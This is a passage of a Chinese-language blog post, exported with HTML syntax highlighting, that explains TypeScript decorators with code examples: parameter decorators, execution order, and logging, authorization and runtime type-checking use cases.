&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>._point;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> c = <span class=\"keyword\">new</span> C();</span><br><span class=\"line\"><span class=\"keyword\">const</span> point = &#123; x: <span class=\"number\">1</span>, y: <span class=\"number\">1</span> &#125;</span><br><span class=\"line\">c.point = point;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(c.point === point)</span><br><span class=\"line\"><span class=\"comment\">// -&gt; false</span></span><br></pre></td></tr></table></figure><p></p><h3 id=\"参数装饰器\"><a href=\"#参数装饰器\" class=\"headerlink\" title=\"参数装饰器\"></a>参数装饰器</h3><p>📌 参数：</p><ul><li><code>target</code>: 对于静态成员来说是类的构造器，对于实例成员来说是类的原型链</li><li><code>propertyKey</code>: 属性的名称(注意是方法的名称，而不是参数的名称)</li><li><code>paramerterIndex</code>: 参数在方法中所处的位置的下标</li></ul><p>⬅️ 返回值：返回的值将会被忽略。</p><p>单独的参数装饰器能做的事情很有限，它一般都被用于记录可被其它装饰器使用的信息。<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// parameter.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">\"reflect-metadata\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">required</span>(<span class=\"params\">target: <span class=\"built_in\">Object</span>, propertyKey: <span class=\"built_in\">string</span> | symbol, parameterIndex: <span class=\"built_in\">number</span></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> existingRequiredParameters: <span class=\"built_in\">number</span>[] = Reflect.getOwnMetadata(<span class=\"string\">'required'</span>, target, propertyKey) || [];</span><br><span class=\"line\">    existingRequiredParameters.push(parameterIndex);</span><br><span class=\"line\">    Reflect.defineMetadata(<span class=\"string\">'required'</span>, existingRequiredParameters, target, propertyKey);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">validate</span>(<span class=\"params\">target: <span class=\"built_in\">any</span>, propertyName: <span class=\"built_in\">string</span>, descriptor: TypedPropertyDescriptor&lt;<span class=\"built_in\">Function</span>&gt;</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> method = descriptor.value!;</span><br><span class=\"line\">   </span><br><span class=\"line\">    descriptor.value = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> requiredParameters: <span class=\"built_in\">number</span>[] = Reflect.getOwnMetadata(<span class=\"string\">'required'</span>, target, propertyName);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (requiredParameters) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> parameterIndex of requiredParameters) &#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (parameterIndex &gt;= <span class=\"built_in\">arguments</span>.length || <span class=\"built_in\">arguments</span>[parameterIndex] === <span class=\"literal\">undefined</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">\"Missing required argument.\"</span>);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> method.apply(<span class=\"keyword\">this</span>, <span class=\"built_in\">arguments</span>);</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> BugReport &#123;</span><br><span class=\"line\">    <span class=\"keyword\">type</span> = <span class=\"string\">\"report\"</span>;</span><br><span class=\"line\">    title: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">   </span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\">t: <span class=\"built_in\">string</span></span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.title = t;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">   </span><br><span class=\"line\">    <span class=\"meta\">@validate</span></span><br><span class=\"line\">    print(<span class=\"meta\">@required</span> verbose: <span class=\"built_in\">boolean</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (verbose) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">`type: <span class=\"subst\">$&#123;<span class=\"keyword\">this</span>.<span class=\"keyword\">type</span>&#125;</span>\\ntitle: <span class=\"subst\">$&#123;<span class=\"keyword\">this</span>.title&#125;</span>`</span>;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">       <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.title; </span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> report = <span class=\"keyword\">new</span> BugReport(<span class=\"string\">'mode error'</span>);</span><br></pre></td></tr></table></figure><p></p><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// test.js</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> &#123; report &#125; = <span class=\"built_in\">require</span>(<span class=\"string\">'./paramerter.js'</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(report.print()); <span class=\"comment\">// Error: Missing required argument.</span></span><br></pre></td></tr></table></figure><h2 id=\"执行顺序\"><a href=\"#执行顺序\" class=\"headerlink\" title=\"执行顺序\"></a>执行顺序</h2><p>不同类型的装饰器执行顺序是明确的：<br>1、 实例成员：参数装饰器 -&gt; 方法/访问器/属性 装饰器<br>2、 静态成员：参数装饰器 -&gt; 方法/访问器/属性 装饰器<br>3、 构造函数：参数装饰器<br>4、 类装饰器<br>例如：</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f</span>(<span class=\"params\">key: <span class=\"built_in\">string</span></span>): <span class=\"title\">any</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"evaluate: \"</span>, key);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"call: \"</span>, key);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@f</span>(<span class=\"string\">\"Class Decorator\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">class</span> A &#123;</span><br><span class=\"line\">  <span class=\"meta\">@f</span>(<span class=\"string\">\"Static Property\"</span>)</span><br><span class=\"line\">  <span class=\"keyword\">static</span> prop?: <span class=\"built_in\">number</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@f</span>(<span class=\"string\">\"Static Method\"</span>)</span><br><span class=\"line\">  <span class=\"keyword\">static</span> method(<span class=\"meta\">@f</span>(<span class=\"string\">\"Static Method Parameter\"</span>) foo) &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"meta\">@f</span>(<span class=\"string\">\"Constructor Parameter\"</span>) foo</span>) &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@f</span>(<span class=\"string\">\"Instance Method\"</span>)</span><br><span class=\"line\">  method(<span class=\"meta\">@f</span>(<span class=\"string\">\"Instance Method Parameter\"</span>) foo) &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@f</span>(<span class=\"string\">\"Instance Property\"</span>)</span><br><span class=\"line\">  prop?: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 执行顺序</span></span><br><span class=\"line\">evaluate:  Instance Method</span><br><span class=\"line\">evaluate:  Instance Method Parameter</span><br><span class=\"line\">call:  Instance Method Parameter</span><br><span class=\"line\">call:  Instance Method</span><br><span class=\"line\">evaluate:  Instance Property</span><br><span class=\"line\">call:  Instance Property</span><br><span class=\"line\">evaluate:  Static Property</span><br><span class=\"line\">call:  Static Property</span><br><span class=\"line\">evaluate:  Static Method</span><br><span class=\"line\">evaluate:  Static Method Parameter</span><br><span class=\"line\">call:  Static Method Parameter</span><br><span class=\"line\">call:  Static Method</span><br><span class=\"line\">evaluate:  Class Decorator</span><br><span class=\"line\">evaluate:  Constructor Parameter</span><br><span class=\"line\">call:  Constructor Parameter</span><br><span class=\"line\">call:  Class Decorator</span><br></pre></td></tr></table></figure><p>然而，在同一方法中的不同参数构造器顺序是相反的，最后参数回的装饰器会先被执行：<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f</span>(<span class=\"params\">key: <span class=\"built_in\">string</span></span>): <span class=\"title\">any</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"evaluate: \"</span>, key);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"call: \"</span>, key);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> B &#123;</span><br><span class=\"line\">  <span class=\"meta\">@f</span>(<span class=\"string\">'first'</span>)</span><br><span class=\"line\">  <span class=\"meta\">@f</span>(<span class=\"string\">'second'</span>)</span><br><span class=\"line\">  method() &#123;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 执行顺序</span></span><br><span class=\"line\">evaluate:  first</span><br><span class=\"line\">evaluate:  second</span><br><span class=\"line\">call:  second</span><br><span class=\"line\">call:  first</span><br></pre></td></tr></table></figure><p></p><h2 id=\"使用场景\"><a href=\"#使用场景\" class=\"headerlink\" title=\"使用场景\"></a>使用场景</h2><ul><li>Before/After钩子。</li><li>监听属性改变或者方法调用。</li><li>对方法的参数做转换。</li><li>添加额外的方法和属性。</li><li>运行时类型检查。</li><li>自动编解码。</li><li>依赖注入。</li></ul><h3 id=\"使用举例\"><a href=\"#使用举例\" class=\"headerlink\" title=\"使用举例\"></a>使用举例</h3><ul><li><p>日志打印</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f</span>(<span class=\"params\"></span>): <span class=\"title\">any</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">target, key, descriptor</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> method = descriptor.value;</span><br><span class=\"line\">    descriptor.value = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(<span class=\"string\">'param: '</span>, <span class=\"built_in\">Array</span>.from(<span class=\"built_in\">arguments</span>));</span><br><span class=\"line\">      <span class=\"keyword\">const</span> value = method.apply(<span class=\"keyword\">this</span>, <span class=\"built_in\">arguments</span>);</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(<span class=\"string\">'result: '</span>, value);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> value</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> B &#123;</span><br><span class=\"line\">  <span class=\"meta\">@f</span>()</span><br><span class=\"line\">  say(name: <span class=\"built_in\">string</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"string\">`name is <span class=\"subst\">$&#123;name&#125;</span>`</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li><li><p>鉴权:</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">auth</span>(<span class=\"params\">user</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">target, key, descriptor</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> originalMethod = descriptor.value; <span class=\"comment\">// 保留原有函数</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!user.isAuth) &#123;</span><br><span class=\"line\">      descriptor.value = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123; <span class=\"comment\">// 未登录将返回提示</span></span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">'当前未登录，请登录!'</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      descriptor.value = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">...args</span>) </span>&#123; <span class=\"comment\">// 已登录将原有函数</span></span><br><span class=\"line\">        originalMethod.apply(<span class=\"keyword\">this</span>, args);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> descriptor;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@auth</span>(app.user)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">handleStar</span>(<span class=\"params\"><span class=\"keyword\">new</span></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">new</span>.like++;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li><li><p>类型检查</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">\"reflect-metadata\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> stringMetaDataTag = <span class=\"string\">\"IsString\"</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">IsString</span>(<span class=\"params\">target: <span class=\"built_in\">Object</span>, propertyKey: <span class=\"built_in\">string</span> | symbol, parameterIndex: <span class=\"built_in\">number</span></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> existingRequiredParameters: <span class=\"built_in\">number</span>[] = Reflect.getOwnMetadata(stringMetaDataTag, target, propertyKey) || [];</span><br><span class=\"line\">  existingRequiredParameters.push(parameterIndex);</span><br><span class=\"line\">  Reflect.defineMetadata( stringMetaDataTag, existingRequiredParameters, target, propertyKey);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">validate</span>(<span class=\"params\">target: <span class=\"built_in\">any</span>, propertyName: <span class=\"built_in\">string</span>, descriptor: TypedPropertyDescriptor&lt;<span class=\"built_in\">Function</span>&gt;</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> method = descriptor.value!;</span><br><span class=\"line\"> </span><br><span class=\"line\">  descriptor.value = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> stringMetaTags: <span class=\"built_in\">number</span>[] = Reflect.getOwnMetadata(stringMetaDataTag, target, propertyName);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (stringMetaTags) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> parameterIndex of stringMetaTags) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> value = <span class=\"built_in\">arguments</span>[parameterIndex];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!(value <span class=\"keyword\">instanceof</span> <span class=\"built_in\">String</span> || <span class=\"keyword\">typeof</span> value === <span class=\"string\">'string'</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">'not string'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> method.apply(<span class=\"keyword\">this</span>, <span class=\"built_in\">arguments</span>);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> A &#123;</span><br><span class=\"line\">    a: <span class=\"built_in\">string</span> = <span class=\"string\">'123'</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"meta\">@validate</span></span><br><span class=\"line\">    value (<span class=\"meta\">@IsString</span> value: <span class=\"built_in\">string</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(value);</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.a = value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id=\"写在最后\"><a href=\"#写在最后\" class=\"headerlink\" title=\"写在最后\"></a>写在最后</h2><p>\b笔者在 后台接口、Js Bridge、React 项目上都有实践过。不得不说，装饰器模式在面向切面编程(AOP)几乎是 “最佳实践”，极大的提升了编程效率。也希望这篇文章能帮助到你😊</p><h3 id=\"npm-包\"><a href=\"#npm-包\" class=\"headerlink\" title=\"npm 包\"></a>npm 包</h3><p><a href=\"https://github.com/typestack/class-validator\" target=\"_blank\" rel=\"noopener\">class-validator</a><br><a href=\"https://github.com/jayphelps/core-decorators\" target=\"_blank\" rel=\"noopener\">core-decorators</a><br><a href=\"https://github.com/nestjs/nest\" target=\"_blank\" rel=\"noopener\">Nest 后台框架</a></p><h3 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h3><p><a href=\"https://github.com/tc39/proposal-decorators\" target=\"_blank\" rel=\"noopener\">tc39-proposal</a><br><a href=\"https://www.typescriptlang.org/docs/handbook/decorators.html\" target=\"_blank\" rel=\"noopener\">typescript</a><br><a href=\"https://saul-mirone.github.io/a-complete-guide-to-typescript-decorator/\" target=\"_blank\" rel=\"noopener\">a-complete-guide-to-typescript-decorator</a></p>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>很多语言和方法都有 AOP 编程。AOP 的好处是只需要写一次函数检查，在函数调用前只做引用即可。极大的减少了重复代码的编写。</p><p>试想一下：在函数入参检查类型时需要反复用 <code>typeof parameter === &#39;类型&#39;</code> 来做检查时一件非常痛苦的事情。虽然用了 <code>Typescript</code>，但只是解决了编码时候的类型校验，而运行时的校验依旧需要编码来做检查。</p><p>本篇介绍的 <code>Decorator</code> 用法，就是为了解决这一困扰而出现的。它不仅一行代码解决了运行时的入参类型检查；还能用一行代码做函数权限检查，只让有权限的人调用；更能一行代码解决入参和结果的日志打印。让代码更容易维护的同时，也更专注于业务的实现。</p><p>如果您对例子感兴趣，可以直接到<a href=\"#使用举例\">使用举例</a></p><h3 id=\"啥是-Decorator\"><a href=\"#啥是-Decorator\" class=\"headerlink\" title=\"啥是 Decorator?\"></a>啥是 Decorator?</h3><p>Decorator 是 ES6 中的提案之一，它实际上是个 wrapper，可以为类、属性或函数提供额外功能。举个🌰：<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f</span>(<span class=\"params\">key: <span class=\"built_in\">string</span></span>): <span class=\"title\">any</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"evaluate: \"</span>, key);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"call: \"</span>, key);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@f</span>(<span class=\"string\">\"Class Decorator\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">class</span> A &#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"meta\">@f</span>(<span class=\"string\">\"Constructor Parameter\"</span>) foo</span>) &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@f</span>(<span class=\"string\">\"Instance Method\"</span>) <span class=\"comment\">// 1</span></span><br><span class=\"line\">  method(<span class=\"meta\">@f</span>(<span class=\"string\">\"Instance Method Parameter\"</span>) foo) &#123;&#125; <span class=\"comment\">// 2</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@f</span>(<span class=\"string\">\"Instance Property\"</span>)</span><br><span class=\"line\">  prop?: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 基本上，装饰器会的行为就是下面这样：</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@f</span>()</span><br><span class=\"line\"><span class=\"keyword\">class</span> A</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 等同于</span></span><br><span class=\"line\">A = f(A) || A</span><br></pre></td></tr></table></figure><p></p><h2 id=\"使用前的准备\"><a href=\"#使用前的准备\" class=\"headerlink\" title=\"使用前的准备\"></a>使用前的准备</h2><p>虽然 Decorator 只是一个提案，但可通过工具来使用它：</p><h3 id=\"Babel\"><a href=\"#Babel\" class=\"headerlink\" title=\"Babel:\"></a>Babel:</h3><blockquote><p>babel-plugin-syntax-decorators<br>babel-plugin-transform-decorators-legacy</p></blockquote><h3 id=\"Typescript\"><a href=\"#Typescript\" class=\"headerlink\" title=\"Typescript:\"></a>Typescript:</h3><p>命令行：<br></p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tsc --target ES5 --experimentalDecorators</span><br></pre></td></tr></table></figure><p></p><p>tsconfig.json:<br></p><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"compilerOptions\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"target\"</span>: <span class=\"string\">\"ES5\"</span>,</span><br><span class=\"line\">    <span 